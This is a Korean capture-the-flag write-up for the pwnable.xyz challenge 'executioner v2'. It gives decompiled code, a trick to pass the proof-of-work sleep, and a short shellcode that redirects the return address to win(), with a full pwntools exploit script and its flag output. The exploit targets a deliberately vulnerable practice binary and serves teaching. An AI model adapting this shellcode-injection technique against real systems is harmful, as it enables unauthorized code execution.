# [pwnable.xyz] executioner v2

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> A bit different from before.
>
> Release: [executioner v2.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9008840/executioner.v2.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176393303-cc3175d1-b983-4451-8623-4579f0dc267c.png)

## Analysis

[Executioner](https://velog.io/@h0meb0dy/pwnable.xyz-executioner) 문제와 비슷한데, 달라진 부분들이 있다.

### `solve_pow()`

```c
  x = 0;
  y = 0;
  printf("POW: x + y == 0x%x\n", buf);
  printf("> ");
  if ( (unsigned int)_isoc99_scanf("%u %u", &x, &y) != 2 || !x || !y )
  {
    puts("error");
    exit(1);
  }
  getchar();
  if ( y + x != buf )
  {
    puts("POW failed");
    exit(1);
  }
  puts("Loading challenge... ");
  sleep(x * y);
```

`solve_pow()`에서 두 수를 입력받는데, 이전 문제에서는 하나에 0을 넣어서 `sleep(0)`이 되도록 만들어서 넘어갔지만, 이번에는 두 수 모두 0이면 안 된다.

### `main()`

```c
    printf("Input: ");
    read(0, inpt, 0x10uLL);
    for ( i = 0; i < strlen(inpt); ++i )
      inpt[i] ^= key[i];
    shellcode = mmap(0LL, 0x1000uLL, 7, 34, 0, 0LL);
    v5 = qword_202288;
    *shellcode = *(_QWORD *)inpt;
    shellcode[1] = v5;
    ((void (__fastcall *)(_QWORD, _QWORD, _QWORD *, _QWORD, _QWORD, _QWORD))shellcode)(
      0LL,
      0LL,
      shellcode,
      0LL,
      0LL,
      0LL);
```

입력할 수 있는 셸코드의 길이가 `0x10`으로 줄었다. 그리고 셸코드를 실행하기 전에 `rbp`, `rsp`, `rip`를 제외한 모든 레지스터의 값을 0으로 초기화한다.

## Exploit

### Pass `solve_pow()`

`x * y`를 0으로 만들기는 거의 불가능하지만 아주 작게 만들 수는 있다. `sleep()`의 인자로 전달되는 값은 `x * y`의 하위 4바이트이기 때문에, 곱한 결과의 하위 4바이트가 아주 작아지는 두 수를 입력하면, 조금만 기다리면 통과할 수 있다.

```python
    # solve_pow

    r.recvuntil('POW: x + y == 0x')
    answer = int(r.recvline()[:-1], 16)

    x = 0xffffffff
    y = answer + 1

    while x == 0 or y == 0 or (x * y) & 0xffffffff > 40: # wait maximum 40 seconds
        x -= 1
        y += 1

    log.info(hex(x) + ' + ' + hex(y) + ' == ' + hex(answer))
    log.info(hex(x) + ' * ' + hex(y) + ' == ' + hex((x * y) & 0xffffffff))
    sla('> ', str(x) + ' ' + str(y))
```

```
$ python3 ex.py
[+] Starting local process './release/challenge': pid 575
[*] 0xfcd0c67c + 0x3f27fd57 == 0x3bf8c3d3
[*] 0xfcd0c67c * 0x3f27fd57 == 0x24
```

### Call `win()`

`main()`에서 셸코드를 실행하고 나면 `main+367`의 주소(`0xe72`)가 return address로 `rsp`에 들어가있게 된다. 이 값을 `pop rax`로 가져와서, `rax`에서 `0x2ce`를 빼서 `win()`의 주소(`0xba6`)로 만들고, `call rax`로 `win()`을 실행하면 플래그를 획득할 수 있다.

```python
    # call win()

    sc = b'\x01\x00'
    sc += asm('''pop rax
    sub ax, 0x2ce
    call rax
    ''')
    
    sa('Input: ', sc)
```

### Full exploit

```python
from pwn import *
context(arch='amd64')

LOCAL = False

while 1:
    if LOCAL:
        r = process('./release/challenge')
    else:
        r = remote('svc.pwnable.xyz', 30028)

    sla = r.sendlineafter
    sa = r.sendafter


    # solve_pow

    r.recvuntil('POW: x + y == 0x')
    answer = int(r.recvline()[:-1], 16)

    x = 0xffffffff
    y = answer + 1

    while x == 0 or y == 0 or (x * y) & 0xffffffff > 40: # wait maximum 40 seconds
        x -= 1
        y += 1

    log.info(hex(x) + ' + ' + hex(y) + ' == ' + hex(answer))
    log.info(hex(x) + ' * ' + hex(y) + ' == ' + hex((x * y) & 0xffffffff))
    sla('> ', str(x) + ' ' + str(y))


    # call win()

    sc = b'\x01\x00'
    sc += asm('''pop rax
    sub ax, 0x2ce
    call rax
    ''')

    try:
        sa('Input: ', sc)
        r.recvn(1)
        break
    except:
        r.close()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30028: Done
[*] 0xff8b0693 + 0x53ce0f36 == 0x535915c9
[*] 0xff8b0693 * 0x53ce0f36 == 0x2
[*] Closed connection to svc.pwnable.xyz port 30028
...
[+] Opening connection to svc.pwnable.xyz on port 30028: Done
[*] 0xffa613a8 + 0x8675f774 == 0x861c0b1c
[*] 0xffa613a8 * 0x8675f774 == 0x20
[*] Switching to interactive mode
LAG{modify_ret_to_win}
```